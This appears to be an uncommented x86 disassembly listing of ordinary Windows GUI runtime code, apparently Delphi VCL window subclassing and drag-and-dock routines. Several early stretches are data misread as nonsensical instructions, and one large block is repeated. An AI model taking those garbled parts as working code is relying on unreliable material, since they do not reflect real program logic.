mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
dec eax
je r-xdata
inc ecx
add ah bl
mov esi 0x92f00044
insb
xor [ ecx + 0x44 ] ch
add ah dl
popad
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax - 0x3c ] cl
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
outsd
insb
jae r-xdata
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
adc [ edx ] al
cwde
add [ ebp + 0x6ab00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
imul eax [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x6b
inc esp
add [ edx + eax ] cl
add [ eax ] al
in al 0x68
inc esp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
outsd
insb
mov eax eax
int3
sub_446b39
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 - 0x2a57ffbc ] bh
inc esp
add [ eax + ebx * 8 - 0x292bffbc ] ah
inc esp
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x30 ]
pop es
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add al al
push esi
inc ebp
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ 0x73754354 ] bl
je r-xdata
or al 0x48
insd
dec ebp
jne r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
outsd
insb
mov eax eax
int3
sub_446c14
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_446ccc
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_446d00
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404410
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_446ccc
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_446d5c
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_446f40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c380
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404470
mov eax edi
mov edx esi
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446f84
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c380
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404470
mov eax edi
mov edx esi
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446ff0
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
mov eax ebx
call sub_45071c
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44709c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4185b0
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_4470d0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45071c
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_4470f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_4470d0
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_44709c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418454
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41862c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447154
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418488
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4185b0
mov edx 0x8
call sub_4026fc
inc esi
dec ebx
jne r-xdata
sub_447188
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4185b0
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_44709c
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_4471ec
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_44724c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030a4
mov edx esp
mov eax esi
call sub_4041b4
add esp 0x100
pop esi
pop ebx
retn
sub_447288
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447352
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_4483a8
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_447d30
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b30
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_447d30
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_4483a8
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_447d30
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_4483a8
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_447357
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_4483a8
sub_4473b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4473da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447440
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4471ec
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_44746c
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403350
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_447498
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403350
xor edx edx
sub_4474f0
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_452340
sub_447510
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_452328
sub_447534
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44741c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42464c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42979c
mov edx eax
mov eax esi
call sub_4247c8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_447598
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4475c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447440
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_447624
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403350
pop edi
pop esi
pop ebp
retn 0x4
sub_447648
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44766c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_447648
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_447648
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_447728
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_447794
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_447be4
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_446d00
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_45071c
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_45071c
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45071c
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403350
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_447728
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_45071c
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_45071c
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44792c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_45071c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45071c
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_447970
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_447188
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_447794
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4185b0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_45071c
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44792c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403350
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44f24c
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4470f8
sub_447acc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41860c
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4184a0
mov edx edi
mov eax [ rw-data ]
call sub_418454
jmp r-xdata
sub_447b2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_447b84
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404410
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_446ccc
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_447be4
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_447b84
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_447c10
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_447970
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_447be4
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_447b2c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_45071c
mov [ esi ] eax
sub_447c60
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_447b2c
cmp eax 0x1
sbb eax eax
inc eax
sub_447c9c
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44f1b8
test eax eax
je r-xdata
mov eax esi
call sub_44f1b8
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_4486cc
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4185b0
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41860c
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
